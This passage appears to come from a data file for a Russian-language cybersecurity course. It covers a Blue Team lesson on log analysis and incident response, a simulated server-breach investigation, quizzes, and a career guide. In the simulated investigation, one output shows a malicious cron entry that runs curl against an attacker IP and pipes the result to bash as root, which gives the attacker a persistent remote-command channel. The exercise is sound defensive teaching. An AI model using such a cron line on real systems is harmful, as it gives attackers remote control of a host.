/var/log/syslog     # Системные события

# Найти brute force SSH:
grep "Failed password" /var/log/auth.log |
awk '{print $11}' | sort | uniq -c | sort -rn
\`\`\`

## MITRE ATT&CK

База реальных техник злоумышленников:

\`\`\`
Initial Access  → T1566 Phishing
Execution       → T1059 PowerShell
Persistence     → T1053 Cron/Tasks
Priv Escalation → T1068 Exploit
Exfiltration    → T1048 DNS tunnel
\`\`\`

## Incident Response (NIST)

\`\`\`
1. Подготовка → IR план, инструменты
2. Обнаружение → SIEM алерт
3. Сдерживание → изолировать хост
4. Ликвидация → удалить малварь
5. Восстановление → вернуть сервисы
6. Уроки → как улучшить защиту
\`\`\``,
      },
      {
        id: 'bt-term', title: 'Практика: расследуем взлом', duration: 25, type: 'terminal',
        terminal: {
          intro: 'СИГНАЛ: подозрительная активность на сервере prod-web-01. Расследуй инцидент.',
          goal: 'Найди следы атаки и определи, что сделал хакер',
          steps: [
            { cmd: 'grep "Failed password" /var/log/auth.log | wc -l', output: '847\n# 847 неудачных попыток входа SSH!\n# Это brute force атака!', hint: 'wc -l считает строки. 847 попыток — явный brute force. Нужно узнать с какого IP.' },
            { cmd: "grep 'Accepted password' /var/log/auth.log", output: 'Jun 30 03:27:44 sshd: Accepted password for admin from 185.234.219.5\n# Успешный вход в 3 ночи с внешнего IP!', hint: 'После 847 попыток — нашли пароль. IP 185.234.219.5 — злоумышленник. 3 часа ночи — не рабочее время.' },
            { cmd: 'find / -newer /tmp/marker -type f 2>/dev/null', output: '/tmp/.hidden_backdoor/srv\n/etc/cron.d/update-checker\n/usr/local/bin/sysupdate\n/var/www/html/uploads/shell.php', hint: 'Нашли! Бэкдор, cron-задача и веб-шелл — следы постэксплуатации.' },
            { cmd: 'cat /etc/cron.d/update-checker', output: '# System update\n* * * * * root curl -s http://185.234.219.5/cmd.sh | bash\n# Каждую минуту скачивает команды от хакера!', hint: 'Малварь каждую минуту скачивает shell-скрипт от хакера. Это C2 (Command & Control) канал через cron.' },
            { cmd: "ss -tulpn | grep 185.234.219.5", output: 'tcp ESTAB 0 0 10.0.0.5:443 185.234.219.5:9001 ("sysupdate",pid=3847)\n# Активное соединение с хакером!', hint: 'sysupdate держит соединение с хакером. PID 3847 — убить! Затем изолировать хост от сети.' },
          ],
        },
      },
      {
        id: 'bt-quiz', title: 'Тест: Blue Team', duration: 6, type: 'quiz',
        quiz: [
          { id: 'btq1', question: 'Windows Event ID 4625 означает:', options: ['Успешный вход', 'Неудачный вход', 'Создание пользователя', 'Изменение пароля'], correctIndex: 1, explanation: '4625 — неудачная попытка входа. Много 4625 за короткое время = brute force. SIEM поднимает алерт при >10 попытках в минуту.' },
          { id: 'btq2', question: 'Что такое MITRE ATT&CK?', options: ['Антивирус', 'База знаний техник реальных злоумышленников', 'Сканер портов', 'Протокол шифрования'], correctIndex: 1, explanation: 'MITRE ATT&CK — матрица реальных техник атакующих из расследованных инцидентов. Помогает Blue Team понять, что искать.' },
          { id: 'btq3', question: 'Хакер установил cron каждую минуту. Первое действие?', options: ['Перезагрузить сервер', 'Изолировать хост от сети', 'Удалить cron-файл', 'Сменить пароли'], correctIndex: 1, explanation: 'Сначала containment — изолируй хост, разорви C2 соединение. Потом удаляй малварь. Перезагрузка может уничтожить доказательства в RAM.' },
        ],
      },
    ],
  },

  {
    id: 'career-track', order: 8,
    title: 'Карьера в кибербезопасности',
    subtitle: 'Сертификаты, роли, путь',
    icon: '🚀', color: '#10b981',
    difficulty: 'intermediate', xpReward: 300,
    requiresStage: 'blue-team',
    description: 'Карьерные пути, зарплаты, сертификации и как найти первую работу.',
    skills: ['CompTIA Security+', 'CEH', 'OSCP', 'CTF', 'Bug Bounty'],
    lessons: [
      {
        id: 'career-l1', title: 'Карьерные пути и зарплаты', duration: 12, type: 'theory',
        content: `# Карьера в кибербезопасности

## Роли и зарплаты (2025)

### 🔴 Red Team
\`\`\`
Junior Pentester     → 80-120 тыс ₽/мес
Penetration Tester   → 150-250 тыс ₽/мес
Senior Red Team      → 300-500 тыс ₽/мес
\`\`\`

### 🔵 Blue Team
\`\`\`
SOC Analyst L1       → 70-100 тыс ₽/мес
SOC Analyst L2/L3    → 120-200 тыс ₽/мес
Incident Responder   → 180-300 тыс ₽/мес
Threat Hunter        → 250-400 тыс ₽/мес
\`\`\`

### 🟣 Специализации
\`\`\`
AppSec Engineer      → 200-400 тыс ₽/мес
Cloud Security       → 250-500 тыс ₽/мес
CISO                 → 500-1500 тыс ₽/мес
\`\`\`

## Дорожная карта сертификаций

\`\`\`
Старт
  ↓
CompTIA Security+     ← первая ИБ сертификация
  ↓
    Red Team          Blue Team
    eJPT / PNPT       SOC Level 1
    CEH               CySA+
    OSCP ★            GCIH
  ↓
Senior: CRTO, OSCE3, CISSP
\`\`\`

**OSCP** — золотой стандарт пентестеров. 24-часовой практический экзамен.

## Практика ПРЯМО СЕЙЧАС (бесплатно)

### CTF платформы:
\`\`\`
TryHackMe.com    ← лучший для новичков
HackTheBox.com   ← реалистичные машины
PicoCTF          ← для студентов
\`\`\`

### Bug Bounty:
\`\`\`
HackerOne.com
Яндекс → до 3 000 000 ₽ за критический баг
ВКонтакте → до 500 000 ₽
\`\`\`

## Что нужно для первой работы

\`\`\`
✓ CompTIA Security+ (или аналог)
✓ Профиль TryHackMe / HackTheBox
✓ GitHub с проектами и скриптами
✓ 1-2 Bug Bounty репорта
✓ Знание Linux и базового Python
✓ Умение объяснить атаку и защиту
\`\`\``,
      },
      {
        id: 'career-quiz', title: 'Тест: Карьера', duration: 5, type: 'quiz',
        quiz: [
          { id: 'caq1', question: 'Какая сертификация — золотой стандарт пентестеров?', options: ['CEH', 'OSCP', 'CompTIA Security+', 'CISM'], correctIndex: 1, explanation: 'OSCP (Offensive Security) — самая уважаемая сертификация. 24-часовой экзамен на реальных машинах. Работодатели в первую очередь смотрят на неё.' },
          { id: 'caq2', question: 'CTF (Capture The Flag) — это:', options: ['Военные учения', 'Соревнования по взлому в легальной среде', 'Тип вируса', 'Метод бэкапа'], correctIndex: 1, explanation: 'CTF — соревнования, где взламывают специально созданные уязвимые системы. Легально и полезно. TryHackMe и HackTheBox — лучшие платформы.' },
          { id: 'caq3', question: 'Яндекс Bug Bounty платит до:', options: ['50 000 ₽', '500 000 ₽', '3 000 000 ₽', '10 000 000 ₽'], correctIndex: 2, explanation: 'Яндекс платит до 3 000 000 ₽ за критические уязвимости. Bug Bounty — отличный способ заработать и собрать портфолио для первой работы.' },
        ],
      },
    ],
  },
];
